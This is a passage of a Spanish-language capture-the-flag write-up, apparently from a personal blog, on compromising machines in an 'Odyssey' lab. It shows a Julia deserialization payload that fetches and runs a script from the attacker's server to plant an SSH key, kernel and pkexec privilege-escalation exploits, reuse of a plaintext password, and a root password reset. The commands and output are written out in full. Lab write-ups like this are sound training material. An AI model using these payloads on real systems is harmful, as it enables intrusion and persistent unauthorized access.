<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ curl </span><span class="p">192.168.21.11:3000/key -d </span><span class="am">"f=</span><span class="sa">$(</span><span class="ve">base64 </span><span class="p">-w0 poc.serialized_jl</span><span class="sa">)</span><span class="am">"  </span><span class="p">
uid=1000(elpenor) gid=1000(elpenor) groups=1000(elpenor)</span>
</code></pre></div></div><br>

<p class="plain-text">En la maquina linux que tenemos compretida creamos un archivo que en caso de ejecutarse guarde nuestra <code class="language-plaintext highlighter-rouge">clave</code> publica como autorizada en el directorio <code class="language-plaintext highlighter-rouge">ssh</code>, esto como index.html y la compartiremos a traver de un servidor <code class="language-plaintext highlighter-rouge">http</code> con python</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p"># cat index.html
mkdir /home/elpenor/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOChqNfHuH3wAgahGKW0RarFeScPycw5i9gJsIjvDWWS kali@kali" &gt;&gt; /home/elpenor/.ssh/authorized_keys  
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p"># python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora creamos un payload con <code class="language-plaintext highlighter-rouge">julia</code> que haga una peticion al servidor <code class="language-plaintext highlighter-rouge">http</code> y guarde el contenido en el archivo llamado <code class="language-plaintext highlighter-rouge">shell</code> en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code> y lo enviamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ./julia
               _
   </span><span class="az">_       </span><span class="p">_ </span><span class="ro">_</span><span class="ve">(_)</span><span class="sa">_     </span><span class="p">|  Documentation: https://docs.julialang.org
</span><span class="az">  (_)    </span><span class="p"> | </span><span class="ro">(_) </span><span class="sa">(_)   </span><span class="p"> |
   _ _   _| |_  __ _   |  Type "?" for help, "]?" for Pkg help.
  | | | | | | |/ _` |  |
  | | |_| | | | (_| |  |  Version 1.1.1 (2019-05-16)
 _/ |\__'_|_|_|\__'_|  |  Official https://julialang.org/ release
|__/                   |


</span><span class="ve">julia&gt; </span><span class="p">using Serialization

</span><span class="ve">julia&gt; </span><span class="p">Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`curl 192.168.21.12 -o /tmp/shell`);  

</span><span class="ve">julia&gt; </span><span class="p">filt=filter(methods(Serialization.deserialize).ms) do m
           String(m.file)[1]=='R' end;

</span><span class="ve">julia&gt; </span><span class="p">Serialization.serialize("poc.serialized_jl", (filt[1], BigInt(7)));

</span><span class="ve">julia&gt;</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ curl </span><span class="p">192.168.21.11:3000/key -d </span><span class="am">"f=</span><span class="sa">$(</span><span class="ve">base64</span><span class="p"> -w0 poc.serialized_jl</span><span class="sa">)</span><span class="am">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Al hacerlo recibimos una <code class="language-plaintext highlighter-rouge">peticion</code> en el servidor que significa que se descargo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p"># python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
192.168.21.11 - - "GET / HTTP/1.1" 200 -</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente creamos un payload que ejecute el archivo <code class="language-plaintext highlighter-rouge">/tmp/shell</code> con bash, enviamos y cuando se interprete guardara nuestra clave <code class="language-plaintext highlighter-rouge">ssh</code> como autorizada</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ./julia
               _
   </span><span class="az">_       </span><span class="p">_ </span><span class="ro">_</span><span class="ve">(_)</span><span class="sa">_     </span><span class="p">|  Documentation: https://docs.julialang.org
</span><span class="az">  (_)    </span><span class="p"> | </span><span class="ro">(_) </span><span class="sa">(_)   </span><span class="p"> |
   _ _   _| |_  __ _   |  Type "?" for help, "]?" for Pkg help.
  | | | | | | |/ _` |  |
  | | |_| | | | (_| |  |  Version 1.1.1 (2019-05-16)
 _/ |\__'_|_|_|\__'_|  |  Official https://julialang.org/ release
|__/                   |

</span><span class="ve">julia&gt; </span><span class="p">using Serialization

</span><span class="ve">julia&gt; </span><span class="p">Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`bash /tmp/shell`);  

</span><span class="ve">julia&gt; </span><span class="p">filt=filter(methods(Serialization.deserialize).ms) do m
           String(m.file)[1]=='R' end;

</span><span class="ve">julia&gt; </span><span class="p">Serialization.serialize("poc.serialized_jl", (filt[1], BigInt(7)));

</span><span class="ve">julia&gt;</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ curl </span><span class="p">192.168.21.11:3000/key -d </span><span class="am">"f=</span><span class="sa">$(</span><span class="ve">base64</span><span class="p"> -w0 poc.serialized_jl</span><span class="sa">)</span><span class="am">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Ya que se ha interpretado y aprovechando nuestra <code class="language-plaintext highlighter-rouge">clave</code> es autorizada podemos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> como elpenor sin siquiera proporcionar una contraseña</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ssh </span><span class="p">elpenor@192.168.21.11
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1000(elpenor) gid=1000(elpenor) groups=1000(elpenor)  
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
192.168.21.11 172.17.0.1 
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat flag.txt 
ODYSSEY{JUL14_d353R14L124710n}
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag6">
<br><h3 class="post-title">Quantum foam</h3>
<h4 class="post-title">ODYSSEY{74k3_c4R3_0f_Y0uR_R4nCH}</h4><br>

<p class="plain-text">Mirando la version de linux en la que estamos encomtramos un <code class="language-plaintext highlighter-rouge">Ubuntu 20.04 LTS</code> el cual es vulnerable al <a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a> que se aprovecha del kernel de linux</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.2 LTS  
Release:	20.04
Codename:	focal
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Aprovechando que la maquina tiene <code class="language-plaintext highlighter-rouge">gcc</code> compilamos el exploit y lo ejecutamos, al ejecutarlo conseguimos una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code> donde leemos la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ gcc exploit.c -o exploit  
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./exploit 
bash-5.0# whoami
root
bash-5.0# hostname -I
192.168.21.11 172.17.0.1 
bash-5.0# cat /root/flag.txt 
ODYSSEY{74k3_c4R3_0f_Y0uR_R4nCH}
bash-5.0#</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag7">
<br><h3 class="post-title">Planck Length</h3>
<h4 class="post-title">ODYSSEY{50LaR15_R8AC_ADM1n15tRAT10n}</h4><br>

<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/root</code> de dev01 encontramos un directorio llamado <code class="language-plaintext highlighter-rouge">Solaris</code>, el cual tiene un archivo llamado <code class="language-plaintext highlighter-rouge">logins.json</code> que contiene lo que parecen credenciales</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@dev01</span><span class="p">:</span><span class="az">~/Solaris</span><span class="p"># cat login.json   
{
  "username": "elpenor",
  "password": "enRH+/&lt;r5y48@yJ",
  "scheme": "pam",
  "preserve": true,
  "timeout": -1
}
</span><span class="ve">root@dev01</span><span class="p">:</span><span class="az">~/Solaris</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Al probar las credenciales hacia el servicio <code class="language-plaintext highlighter-rouge">ssh</code> de la maquina <code class="language-plaintext highlighter-rouge">.13</code> que es la ultima maquina que nos queda obtenemos una shell como el usuario <code class="language-plaintext highlighter-rouge">elpenor</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ssh </span><span class="p">elpenor@192.168.21.13
(elpenor@192.168.21.13) Password: enRH+/&lt;r5y48@yJ  
</span><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=100(elpenor) gid=10(staff)
</span><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text"><code class="language-plaintext highlighter-rouge">Solaris</code> tiene un comando que es <code class="language-plaintext highlighter-rouge">auths</code> el cual muestra las autorizaciones que tiene el usuario, curiosamente nuestro usuario actual tiene <code class="language-plaintext highlighter-rouge">solaris.passwd.assign</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$ auths
solaris.account.activate,solaris.admin.wusb.read,solaris.mail.mailq,solaris.network.autoconf.read,solaris.passwd.assign  
</span><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Este privilegio nos permite cambiarle la contraseña a cualquier usuario, como <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$ passwd root
New Password: password123#
Re-enter new Password: password123#
passwd: password successfully changed for root  
</span><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de cambiarle la contraseña a <code class="language-plaintext highlighter-rouge">root</code> solo nos queda ejecutar un <code class="language-plaintext highlighter-rouge">su</code> y al proporcionar la contraseña nos convertimos en el, podemos leer la ultima <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">elpenor@dev</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
Password: password123#
</span><span class="ve">root@dev</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root)
</span><span class="ve">root@dev</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/flag.txt 
ODYSSEY{50LaR15_R8AC_ADM1n15tRAT10n}  
</span><span class="ve">root@dev</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

<section class="post" id="extra">
<br><h3 class="post-title">Extra</h3>
<h4 class="post-title">CVE-2021-4034 - root odyssey / root dev01</h4><br>

<p class="plain-text">Como alternativa si en la primera maquina buscamos por privilegios <code class="language-plaintext highlighter-rouge">suid</code> vemos el ya famoso <code class="language-plaintext highlighter-rouge">pkexec</code>, con un exploit del <a href="https://github.com/joeammond/CVE-2021-4034/">pwnkit</a> nos podemos convertir en root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2&gt;/dev/null | grep -v snap  
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/at
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 Aug 16  2019 </span><span class="err">/usr/bin/pkexec</span><span class="p">
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.  
[+] Calling execve()
# whoami
root
# hostname -I
192.168.21.12 172.17.0.1 10.1.148.128 
# cat /root/flag.txt
ODYSSEY{W3_4LL_4r3_p4r7_Of_4_cluS73R}
#</span>
</code></pre></div></div><br>

<p class="plain-text">Pasa exactamente lo mismo en la maquina dev01 que tambien tiene el <code class="language-plaintext highlighter-rouge">pkexec</code> suid</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">lpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -4000 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 Aug 16  2019 </span><span class="err">/usr/bin/pkexec</span><span class="p">  
</span><span class="ve">elpenor@dev01</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.  
[+] Calling execve()
# whoami
root
# hostname -I
192.168.21.11 172.17.0.1 
# cat /root/flag.txt
ODYSSEY{74k3_c4R3_0f_Y0uR_R4nCH}
#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">© 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  




</body></html>
